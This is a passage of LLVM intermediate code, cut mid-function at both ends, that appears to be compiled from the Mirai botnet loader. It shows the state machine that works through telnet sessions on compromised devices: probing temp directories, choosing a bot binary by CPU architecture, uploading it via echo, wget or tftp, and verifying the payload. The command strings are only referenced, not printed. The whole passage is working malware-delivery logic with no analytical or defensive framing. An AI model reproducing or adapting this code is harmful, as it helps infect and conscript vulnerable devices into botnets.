  %252 = icmp sgt i32 %251, 0
  br i1 %252, label %253, label %281

253:                                              ; preds = %249
  %254 = load %struct.connection*, %struct.connection** %6, align 8
  %255 = getelementptr inbounds %struct.connection, %struct.connection* %254, i32 0, i32 4
  %256 = load i32, i32* %255, align 8
  %257 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %256, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.17, i64 0, i64 0))
  %258 = load %struct.connection*, %struct.connection** %6, align 8
  %259 = getelementptr inbounds %struct.connection, %struct.connection* %258, i32 0, i32 4
  %260 = load i32, i32* %259, align 8
  %261 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %260, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i64 0, i64 0))
  %262 = load %struct.connection*, %struct.connection** %6, align 8
  %263 = getelementptr inbounds %struct.connection, %struct.connection* %262, i32 0, i32 4
  %264 = load i32, i32* %263, align 8
  %265 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %264, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i64 0, i64 0))
  %266 = load %struct.connection*, %struct.connection** %6, align 8
  %267 = getelementptr inbounds %struct.connection, %struct.connection* %266, i32 0, i32 4
  %268 = load i32, i32* %267, align 8
  %269 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %268, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.20, i64 0, i64 0))
  %270 = load %struct.connection*, %struct.connection** %6, align 8
  %271 = getelementptr inbounds %struct.connection, %struct.connection* %270, i32 0, i32 4
  %272 = load i32, i32* %271, align 8
  %273 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %272, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0))
  %274 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %275 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %274, i32 0, i32 0
  %276 = load %struct.server*, %struct.server** %275, align 8
  %277 = getelementptr inbounds %struct.server, %struct.server* %276, i32 0, i32 3
  %278 = atomicrmw add i32* %277, i32 1 seq_cst, align 4
  %279 = load %struct.connection*, %struct.connection** %6, align 8
  %280 = getelementptr inbounds %struct.connection, %struct.connection* %279, i32 0, i32 10
  store i32 9, i32* %280, align 8
  br label %281

281:                                              ; preds = %253, %249
  br label %779

282:                                              ; preds = %180
  store i32 0, i32* %5, align 4
  br label %283

283:                                              ; preds = %299, %282
  %284 = load i32, i32* %5, align 4
  %285 = icmp slt i32 %284, 13
  br i1 %285, label %286, label %302

286:                                              ; preds = %283
  %287 = load %struct.connection*, %struct.connection** %6, align 8
  %288 = getelementptr inbounds %struct.connection, %struct.connection* %287, i32 0, i32 4
  %289 = load i32, i32* %288, align 8
  %290 = load i32, i32* %5, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds [13 x i8*], [13 x i8*]* @tmp_dirs, i64 0, i64 %291
  %293 = load i8*, i8** %292, align 8
  %294 = load i32, i32* %5, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds [13 x i8*], [13 x i8*]* @tmp_dirs, i64 0, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %289, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.22, i64 0, i64 0), i8* %293, i8* %297)
  br label %299

299:                                              ; preds = %286
  %300 = load i32, i32* %5, align 4
  %301 = add nsw i32 %300, 1
  store i32 %301, i32* %5, align 4
  br label %283, !llvm.loop !12

302:                                              ; preds = %283
  %303 = load %struct.connection*, %struct.connection** %6, align 8
  %304 = getelementptr inbounds %struct.connection, %struct.connection* %303, i32 0, i32 4
  %305 = load i32, i32* %304, align 8
  %306 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %305, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.25, i64 0, i64 0))
  %307 = load %struct.connection*, %struct.connection** %6, align 8
  %308 = getelementptr inbounds %struct.connection, %struct.connection* %307, i32 0, i32 4
  %309 = load i32, i32* %308, align 8
  %310 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %309, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.26, i64 0, i64 0))
  %311 = load %struct.connection*, %struct.connection** %6, align 8
  %312 = getelementptr inbounds %struct.connection, %struct.connection* %311, i32 0, i32 10
  store i32 10, i32* %312, align 8
  %313 = load %struct.connection*, %struct.connection** %6, align 8
  %314 = getelementptr inbounds %struct.connection, %struct.connection* %313, i32 0, i32 13
  store i16 120, i16* %314, align 2
  br label %779

315:                                              ; preds = %180
  %316 = load %struct.connection*, %struct.connection** %6, align 8
  %317 = call i32 @connection_consume_copy_op(%struct.connection* %316)
  store i32 %317, i32* %11, align 4
  %318 = load i32, i32* %11, align 4
  %319 = icmp ne i32 %318, 0
  br i1 %319, label %320, label %349

320:                                              ; preds = %315
  %321 = load %struct.connection*, %struct.connection** %6, align 8
  %322 = getelementptr inbounds %struct.connection, %struct.connection* %321, i32 0, i32 3
  %323 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %322, i32 0, i32 8
  %324 = load i8, i8* %323, align 1
  %325 = icmp ne i8 %324, 0
  br i1 %325, label %339, label %326

326:                                              ; preds = %320
  %327 = load %struct.connection*, %struct.connection** %6, align 8
  %328 = getelementptr inbounds %struct.connection, %struct.connection* %327, i32 0, i32 10
  store i32 11, i32* %328, align 8
  %329 = load %struct.connection*, %struct.connection** %6, align 8
  %330 = getelementptr inbounds %struct.connection, %struct.connection* %329, i32 0, i32 13
  store i16 200, i16* %330, align 2
  %331 = load %struct.connection*, %struct.connection** %6, align 8
  %332 = getelementptr inbounds %struct.connection, %struct.connection* %331, i32 0, i32 4
  %333 = load i32, i32* %332, align 8
  %334 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %333, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.27, i64 0, i64 0))
  %335 = load %struct.connection*, %struct.connection** %6, align 8
  %336 = getelementptr inbounds %struct.connection, %struct.connection* %335, i32 0, i32 4
  %337 = load i32, i32* %336, align 8
  %338 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %337, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.28, i64 0, i64 0))
  br label %348

339:                                              ; preds = %320
  %340 = load %struct.connection*, %struct.connection** %6, align 8
  %341 = getelementptr inbounds %struct.connection, %struct.connection* %340, i32 0, i32 10
  store i32 13, i32* %341, align 8
  %342 = load %struct.connection*, %struct.connection** %6, align 8
  %343 = getelementptr inbounds %struct.connection, %struct.connection* %342, i32 0, i32 13
  store i16 45, i16* %343, align 2
  %344 = load %struct.connection*, %struct.connection** %6, align 8
  %345 = getelementptr inbounds %struct.connection, %struct.connection* %344, i32 0, i32 4
  %346 = load i32, i32* %345, align 8
  %347 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %346, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.29, i64 0, i64 0))
  br label %348

348:                                              ; preds = %339, %326
  br label %349

349:                                              ; preds = %348, %315
  br label %779

350:                                              ; preds = %180
  %351 = load %struct.connection*, %struct.connection** %6, align 8
  %352 = call i32 @connection_consume_arch(%struct.connection* %351)
  store i32 %352, i32* %11, align 4
  %353 = load i32, i32* %11, align 4
  %354 = icmp ne i32 %353, 0
  br i1 %354, label %355, label %397

355:                                              ; preds = %350
  %356 = load %struct.connection*, %struct.connection** %6, align 8
  %357 = getelementptr inbounds %struct.connection, %struct.connection* %356, i32 0, i32 13
  store i16 45, i16* %357, align 2
  %358 = load %struct.connection*, %struct.connection** %6, align 8
  %359 = getelementptr inbounds %struct.connection, %struct.connection* %358, i32 0, i32 3
  %360 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %359, i32 0, i32 2
  %361 = getelementptr inbounds [6 x i8], [6 x i8]* %360, i64 0, i64 0
  %362 = load %struct.connection*, %struct.connection** %6, align 8
  %363 = getelementptr inbounds %struct.connection, %struct.connection* %362, i32 0, i32 3
  %364 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %363, i32 0, i32 2
  %365 = getelementptr inbounds [6 x i8], [6 x i8]* %364, i64 0, i64 0
  %366 = call i64 @strlen(i8* %365) #10
  %367 = trunc i64 %366 to i32
  %368 = call %struct.binary* @binary_get_by_arch(i8* %361, i32 %367)
  %369 = load %struct.connection*, %struct.connection** %6, align 8
  %370 = getelementptr inbounds %struct.connection, %struct.connection* %369, i32 0, i32 2
  store %struct.binary* %368, %struct.binary** %370, align 8
  %371 = icmp eq %struct.binary* %368, null
  br i1 %371, label %372, label %374

372:                                              ; preds = %355
  %373 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %373)
  br label %396

374:                                              ; preds = %355
  %375 = load %struct.connection*, %struct.connection** %6, align 8
  %376 = getelementptr inbounds %struct.connection, %struct.connection* %375, i32 0, i32 3
  %377 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %376, i32 0, i32 2
  %378 = getelementptr inbounds [6 x i8], [6 x i8]* %377, i64 0, i64 0
  %379 = call i32 @strcmp(i8* %378, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i64 0, i64 0)) #10
  %380 = icmp eq i32 %379, 0
  br i1 %380, label %381, label %388

381:                                              ; preds = %374
  %382 = load %struct.connection*, %struct.connection** %6, align 8
  %383 = getelementptr inbounds %struct.connection, %struct.connection* %382, i32 0, i32 4
  %384 = load i32, i32* %383, align 8
  %385 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %384, i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.31, i64 0, i64 0))
  %386 = load %struct.connection*, %struct.connection** %6, align 8
  %387 = getelementptr inbounds %struct.connection, %struct.connection* %386, i32 0, i32 10
  store i32 12, i32* %387, align 8
  br label %395

388:                                              ; preds = %374
  %389 = load %struct.connection*, %struct.connection** %6, align 8
  %390 = getelementptr inbounds %struct.connection, %struct.connection* %389, i32 0, i32 4
  %391 = load i32, i32* %390, align 8
  %392 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %391, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.29, i64 0, i64 0))
  %393 = load %struct.connection*, %struct.connection** %6, align 8
  %394 = getelementptr inbounds %struct.connection, %struct.connection* %393, i32 0, i32 10
  store i32 13, i32* %394, align 8
  br label %395

395:                                              ; preds = %388, %381
  br label %396

396:                                              ; preds = %395, %372
  br label %397

397:                                              ; preds = %396, %350
  br label %779

398:                                              ; preds = %180
  %399 = load %struct.connection*, %struct.connection** %6, align 8
  %400 = call i32 @connection_consume_arm_subtype(%struct.connection* %399)
  store i32 %400, i32* %11, align 4
  %401 = icmp sgt i32 %400, 0
  br i1 %401, label %402, label %428

402:                                              ; preds = %398
  %403 = load %struct.connection*, %struct.connection** %6, align 8
  %404 = getelementptr inbounds %struct.connection, %struct.connection* %403, i32 0, i32 3
  %405 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %404, i32 0, i32 2
  %406 = getelementptr inbounds [6 x i8], [6 x i8]* %405, i64 0, i64 0
  %407 = load %struct.connection*, %struct.connection** %6, align 8
  %408 = getelementptr inbounds %struct.connection, %struct.connection* %407, i32 0, i32 3
  %409 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %408, i32 0, i32 2
  %410 = getelementptr inbounds [6 x i8], [6 x i8]* %409, i64 0, i64 0
  %411 = call i64 @strlen(i8* %410) #10
  %412 = trunc i64 %411 to i32
  %413 = call %struct.binary* @binary_get_by_arch(i8* %406, i32 %412)
  store %struct.binary* %413, %struct.binary** %12, align 8
  %414 = load %struct.binary*, %struct.binary** %12, align 8
  %415 = icmp eq %struct.binary* %414, null
  br i1 %415, label %416, label %417

416:                                              ; preds = %402
  br label %421

417:                                              ; preds = %402
  %418 = load %struct.binary*, %struct.binary** %12, align 8
  %419 = load %struct.connection*, %struct.connection** %6, align 8
  %420 = getelementptr inbounds %struct.connection, %struct.connection* %419, i32 0, i32 2
  store %struct.binary* %418, %struct.binary** %420, align 8
  br label %421

421:                                              ; preds = %417, %416
  %422 = load %struct.connection*, %struct.connection** %6, align 8
  %423 = getelementptr inbounds %struct.connection, %struct.connection* %422, i32 0, i32 4
  %424 = load i32, i32* %423, align 8
  %425 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %424, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.29, i64 0, i64 0))
  %426 = load %struct.connection*, %struct.connection** %6, align 8
  %427 = getelementptr inbounds %struct.connection, %struct.connection* %426, i32 0, i32 10
  store i32 13, i32* %427, align 8
  br label %428

428:                                              ; preds = %421, %398
  br label %779

429:                                              ; preds = %180
  %430 = load %struct.connection*, %struct.connection** %6, align 8
  %431 = call i32 @connection_consume_upload_methods(%struct.connection* %430)
  store i32 %431, i32* %11, align 4
  %432 = load i32, i32* %11, align 4
  %433 = icmp ne i32 %432, 0
  br i1 %433, label %434, label %491

434:                                              ; preds = %429
  %435 = load %struct.connection*, %struct.connection** %6, align 8
  %436 = getelementptr inbounds %struct.connection, %struct.connection* %435, i32 0, i32 3
  %437 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %436, i32 0, i32 6
  %438 = load i32, i32* %437, align 8
  switch i32 %438, label %490 [
    i32 0, label %439
    i32 1, label %448
    i32 2, label %472
  ]

439:                                              ; preds = %434
  %440 = load %struct.connection*, %struct.connection** %6, align 8
  %441 = getelementptr inbounds %struct.connection, %struct.connection* %440, i32 0, i32 10
  store i32 14, i32* %441, align 8
  %442 = load %struct.connection*, %struct.connection** %6, align 8
  %443 = getelementptr inbounds %struct.connection, %struct.connection* %442, i32 0, i32 13
  store i16 45, i16* %443, align 2
  %444 = load %struct.connection*, %struct.connection** %6, align 8
  %445 = getelementptr inbounds %struct.connection, %struct.connection* %444, i32 0, i32 4
  %446 = load i32, i32* %445, align 8
  %447 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %446, i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.32, i64 0, i64 0))
  br label %490

448:                                              ; preds = %434
  %449 = load %struct.connection*, %struct.connection** %6, align 8
  %450 = getelementptr inbounds %struct.connection, %struct.connection* %449, i32 0, i32 10
  store i32 15, i32* %450, align 8
  %451 = load %struct.connection*, %struct.connection** %6, align 8
  %452 = getelementptr inbounds %struct.connection, %struct.connection* %451, i32 0, i32 13
  store i16 120, i16* %452, align 2
  %453 = load %struct.connection*, %struct.connection** %6, align 8
  %454 = getelementptr inbounds %struct.connection, %struct.connection* %453, i32 0, i32 4
  %455 = load i32, i32* %454, align 8
  %456 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %457 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %456, i32 0, i32 0
  %458 = load %struct.server*, %struct.server** %457, align 8
  %459 = getelementptr inbounds %struct.server, %struct.server* %458, i32 0, i32 9
  %460 = load i8*, i8** %459, align 8
  %461 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %462 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %461, i32 0, i32 0
  %463 = load %struct.server*, %struct.server** %462, align 8
  %464 = getelementptr inbounds %struct.server, %struct.server* %463, i32 0, i32 15
  %465 = load i16, i16* %464, align 8
  %466 = zext i16 %465 to i32
  %467 = load %struct.connection*, %struct.connection** %6, align 8
  %468 = getelementptr inbounds %struct.connection, %struct.connection* %467, i32 0, i32 3
  %469 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %468, i32 0, i32 2
  %470 = getelementptr inbounds [6 x i8], [6 x i8]* %469, i64 0, i64 0
  %471 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %455, i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str.33, i64 0, i64 0), i8* %460, i32 %466, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i64 0, i64 0), i8* %470)
  br label %490

472:                                              ; preds = %434
  %473 = load %struct.connection*, %struct.connection** %6, align 8
  %474 = getelementptr inbounds %struct.connection, %struct.connection* %473, i32 0, i32 10
  store i32 16, i32* %474, align 8
  %475 = load %struct.connection*, %struct.connection** %6, align 8
  %476 = getelementptr inbounds %struct.connection, %struct.connection* %475, i32 0, i32 13
  store i16 120, i16* %476, align 2
  %477 = load %struct.connection*, %struct.connection** %6, align 8
  %478 = getelementptr inbounds %struct.connection, %struct.connection* %477, i32 0, i32 4
  %479 = load i32, i32* %478, align 8
  %480 = load %struct.connection*, %struct.connection** %6, align 8
  %481 = getelementptr inbounds %struct.connection, %struct.connection* %480, i32 0, i32 3
  %482 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %481, i32 0, i32 2
  %483 = getelementptr inbounds [6 x i8], [6 x i8]* %482, i64 0, i64 0
  %484 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %485 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %484, i32 0, i32 0
  %486 = load %struct.server*, %struct.server** %485, align 8
  %487 = getelementptr inbounds %struct.server, %struct.server* %486, i32 0, i32 10
  %488 = load i8*, i8** %487, align 8
  %489 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %479, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.35, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i64 0, i64 0), i8* %483, i8* %488)
  br label %490

490:                                              ; preds = %434, %472, %448, %439
  br label %491

491:                                              ; preds = %490, %429
  br label %779

492:                                              ; preds = %180
  %493 = load %struct.connection*, %struct.connection** %6, align 8
  %494 = call i32 @connection_upload_echo(%struct.connection* %493)
  store i32 %494, i32* %11, align 4
  %495 = load i32, i32* %11, align 4
  %496 = icmp ne i32 %495, 0
  br i1 %496, label %497, label %533

497:                                              ; preds = %492
  %498 = load %struct.connection*, %struct.connection** %6, align 8
  %499 = getelementptr inbounds %struct.connection, %struct.connection* %498, i32 0, i32 10
  store i32 17, i32* %499, align 8
  %500 = load %struct.connection*, %struct.connection** %6, align 8
  %501 = getelementptr inbounds %struct.connection, %struct.connection* %500, i32 0, i32 13
  store i16 45, i16* %501, align 2
  %502 = load %struct.connection*, %struct.connection** %6, align 8
  %503 = getelementptr inbounds %struct.connection, %struct.connection* %502, i32 0, i32 3
  %504 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %503, i32 0, i32 2
  %505 = getelementptr inbounds [6 x i8], [6 x i8]* %504, i64 0, i64 0
  %506 = call i32 @strncmp(i8* %505, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.36, i64 0, i64 0), i64 3) #10
  %507 = icmp eq i32 %506, 0
  br i1 %507, label %508, label %517

508:                                              ; preds = %497
  %509 = load %struct.connection*, %struct.connection** %6, align 8
  %510 = getelementptr inbounds %struct.connection, %struct.connection* %509, i32 0, i32 4
  %511 = load i32, i32* %510, align 8
  %512 = load %struct.connection*, %struct.connection** %6, align 8
  %513 = getelementptr inbounds %struct.connection, %struct.connection* %512, i32 0, i32 3
  %514 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %513, i32 0, i32 2
  %515 = getelementptr inbounds [6 x i8], [6 x i8]* %514, i64 0, i64 0
  %516 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %511, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.37, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.25, i64 0, i64 0), i8* %515)
  br label %527

517:                                              ; preds = %497
  %518 = load %struct.connection*, %struct.connection** %6, align 8
  %519 = getelementptr inbounds %struct.connection, %struct.connection* %518, i32 0, i32 4
  %520 = load i32, i32* %519, align 8
  %521 = load i8*, i8** @id_tag, align 8
  %522 = load %struct.connection*, %struct.connection** %6, align 8
  %523 = getelementptr inbounds %struct.connection, %struct.connection* %522, i32 0, i32 3
  %524 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %523, i32 0, i32 2
  %525 = getelementptr inbounds [6 x i8], [6 x i8]* %524, i64 0, i64 0
  %526 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %520, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.38, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.25, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i8* %521, i8* %525)
  br label %527

527:                                              ; preds = %517, %508
  %528 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %529 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %528, i32 0, i32 0
  %530 = load %struct.server*, %struct.server** %529, align 8
  %531 = getelementptr inbounds %struct.server, %struct.server* %530, i32 0, i32 4
  %532 = atomicrmw add i32* %531, i32 1 seq_cst, align 4
  br label %533

533:                                              ; preds = %527, %492
  br label %779

534:                                              ; preds = %180
  %535 = load %struct.connection*, %struct.connection** %6, align 8
  %536 = call i32 @connection_upload_wget(%struct.connection* %535)
  store i32 %536, i32* %11, align 4
  %537 = load i32, i32* %11, align 4
  %538 = icmp sgt i32 %537, 0
  br i1 %538, label %539, label %558

539:                                              ; preds = %534
  %540 = load %struct.connection*, %struct.connection** %6, align 8
  %541 = getelementptr inbounds %struct.connection, %struct.connection* %540, i32 0, i32 10
  store i32 17, i32* %541, align 8
  %542 = load %struct.connection*, %struct.connection** %6, align 8
  %543 = getelementptr inbounds %struct.connection, %struct.connection* %542, i32 0, i32 13
  store i16 45, i16* %543, align 2
  %544 = load %struct.connection*, %struct.connection** %6, align 8
  %545 = getelementptr inbounds %struct.connection, %struct.connection* %544, i32 0, i32 4
  %546 = load i32, i32* %545, align 8
  %547 = load i8*, i8** @id_tag, align 8
  %548 = load %struct.connection*, %struct.connection** %6, align 8
  %549 = getelementptr inbounds %struct.connection, %struct.connection* %548, i32 0, i32 3
  %550 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %549, i32 0, i32 2
  %551 = getelementptr inbounds [6 x i8], [6 x i8]* %550, i64 0, i64 0
  %552 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %546, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.39, i64 0, i64 0), i8* %547, i8* %551)
  %553 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %554 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %553, i32 0, i32 0
  %555 = load %struct.server*, %struct.server** %554, align 8
  %556 = getelementptr inbounds %struct.server, %struct.server* %555, i32 0, i32 5
  %557 = atomicrmw add i32* %556, i32 1 seq_cst, align 4
  br label %591

558:                                              ; preds = %534
  %559 = load i32, i32* %11, align 4
  %560 = icmp slt i32 %559, -1
  br i1 %560, label %561, label %590

561:                                              ; preds = %558
  %562 = load i32, i32* %11, align 4
  %563 = mul nsw i32 %562, -1
  store i32 %563, i32* %11, align 4
  %564 = load %struct.connection*, %struct.connection** %6, align 8
  %565 = getelementptr inbounds %struct.connection, %struct.connection* %564, i32 0, i32 10
  store i32 14, i32* %565, align 8
  %566 = load %struct.connection*, %struct.connection** %6, align 8
  %567 = getelementptr inbounds %struct.connection, %struct.connection* %566, i32 0, i32 3
  %568 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %567, i32 0, i32 6
  store i32 0, i32* %568, align 8
  %569 = load %struct.connection*, %struct.connection** %6, align 8
  %570 = getelementptr inbounds %struct.connection, %struct.connection* %569, i32 0, i32 13
  store i16 45, i16* %570, align 2
  %571 = load %struct.connection*, %struct.connection** %6, align 8
  %572 = getelementptr inbounds %struct.connection, %struct.connection* %571, i32 0, i32 8
  %573 = load i32, i32* %572, align 8
  %574 = icmp eq i32 %573, 1
  br i1 %574, label %575, label %584

575:                                              ; preds = %561
  %576 = load %struct.connection*, %struct.connection** %6, align 8
  %577 = getelementptr inbounds %struct.connection, %struct.connection* %576, i32 0, i32 4
  %578 = load i32, i32* %577, align 8
  %579 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %578, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.40, i64 0, i64 0))
  %580 = load %struct.connection*, %struct.connection** %6, align 8
  %581 = getelementptr inbounds %struct.connection, %struct.connection* %580, i32 0, i32 4
  %582 = load i32, i32* %581, align 8
  %583 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %582, i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.32, i64 0, i64 0))
  br label %589

584:                                              ; preds = %561
  %585 = load %struct.connection*, %struct.connection** %6, align 8
  %586 = getelementptr inbounds %struct.connection, %struct.connection* %585, i32 0, i32 4
  %587 = load i32, i32* %586, align 8
  %588 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %587, i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.32, i64 0, i64 0))
  br label %589

589:                                              ; preds = %584, %575
  br label %590

590:                                              ; preds = %589, %558
  br label %591

591:                                              ; preds = %590, %539
  br label %779

592:                                              ; preds = %180
  %593 = load %struct.connection*, %struct.connection** %6, align 8
  %594 = call i32 @connection_upload_tftp(%struct.connection* %593)
  store i32 %594, i32* %11, align 4
  %595 = load i32, i32* %11, align 4
  %596 = icmp sgt i32 %595, 0
  br i1 %596, label %597, label %612

597:                                              ; preds = %592
  %598 = load %struct.connection*, %struct.connection** %6, align 8
  %599 = getelementptr inbounds %struct.connection, %struct.connection* %598, i32 0, i32 10
  store i32 17, i32* %599, align 8
  %600 = load %struct.connection*, %struct.connection** %6, align 8
  %601 = getelementptr inbounds %struct.connection, %struct.connection* %600, i32 0, i32 13
  store i16 45, i16* %601, align 2
  %602 = load %struct.connection*, %struct.connection** %6, align 8
  %603 = getelementptr inbounds %struct.connection, %struct.connection* %602, i32 0, i32 4
  %604 = load i32, i32* %603, align 8
  %605 = load i8*, i8** @id_tag, align 8
  %606 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %604, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.41, i64 0, i64 0), i8* %605)
  %607 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %608 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %607, i32 0, i32 0
  %609 = load %struct.server*, %struct.server** %608, align 8
  %610 = getelementptr inbounds %struct.server, %struct.server* %609, i32 0, i32 6
  %611 = atomicrmw add i32* %610, i32 1 seq_cst, align 4
  br label %645

612:                                              ; preds = %592
  %613 = load i32, i32* %11, align 4
  %614 = icmp slt i32 %613, -1
  br i1 %614, label %615, label %644

615:                                              ; preds = %612
  %616 = load i32, i32* %11, align 4
  %617 = mul nsw i32 %616, -1
  store i32 %617, i32* %11, align 4
  %618 = load %struct.connection*, %struct.connection** %6, align 8
  %619 = getelementptr inbounds %struct.connection, %struct.connection* %618, i32 0, i32 10
  store i32 14, i32* %619, align 8
  %620 = load %struct.connection*, %struct.connection** %6, align 8
  %621 = getelementptr inbounds %struct.connection, %struct.connection* %620, i32 0, i32 3
  %622 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %621, i32 0, i32 6
  store i32 0, i32* %622, align 8
  %623 = load %struct.connection*, %struct.connection** %6, align 8
  %624 = getelementptr inbounds %struct.connection, %struct.connection* %623, i32 0, i32 13
  store i16 45, i16* %624, align 2
  %625 = load %struct.connection*, %struct.connection** %6, align 8
  %626 = getelementptr inbounds %struct.connection, %struct.connection* %625, i32 0, i32 8
  %627 = load i32, i32* %626, align 8
  %628 = icmp eq i32 %627, 1
  br i1 %628, label %629, label %638

629:                                              ; preds = %615
  %630 = load %struct.connection*, %struct.connection** %6, align 8
  %631 = getelementptr inbounds %struct.connection, %struct.connection* %630, i32 0, i32 4
  %632 = load i32, i32* %631, align 8
  %633 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %632, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.40, i64 0, i64 0))
  %634 = load %struct.connection*, %struct.connection** %6, align 8
  %635 = getelementptr inbounds %struct.connection, %struct.connection* %634, i32 0, i32 4
  %636 = load i32, i32* %635, align 8
  %637 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %636, i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.32, i64 0, i64 0))
  br label %643

638:                                              ; preds = %615
  %639 = load %struct.connection*, %struct.connection** %6, align 8
  %640 = getelementptr inbounds %struct.connection, %struct.connection* %639, i32 0, i32 4
  %641 = load i32, i32* %640, align 8
  %642 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %641, i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.32, i64 0, i64 0))
  br label %643

643:                                              ; preds = %638, %629
  br label %644

644:                                              ; preds = %643, %612
  br label %645

645:                                              ; preds = %644, %597
  br label %779

646:                                              ; preds = %180
  %647 = load %struct.connection*, %struct.connection** %6, align 8
  %648 = call i32 @connection_verify_payload(%struct.connection* %647)
  store i32 %648, i32* %11, align 4
  %649 = icmp sgt i32 %648, 0
  br i1 %649, label %650, label %767

650:                                              ; preds = %646
  %651 = load i32, i32* %11, align 4
  %652 = icmp sge i32 %651, 255
  br i1 %652, label %653, label %658

653:                                              ; preds = %650
  %654 = load %struct.connection*, %struct.connection** %6, align 8
  %655 = getelementptr inbounds %struct.connection, %struct.connection* %654, i32 0, i32 15
  store i8 1, i8* %655, align 1
  %656 = load i32, i32* %11, align 4
  %657 = sub nsw i32 %656, 255
  store i32 %657, i32* %11, align 4
  br label %758

658:                                              ; preds = %650
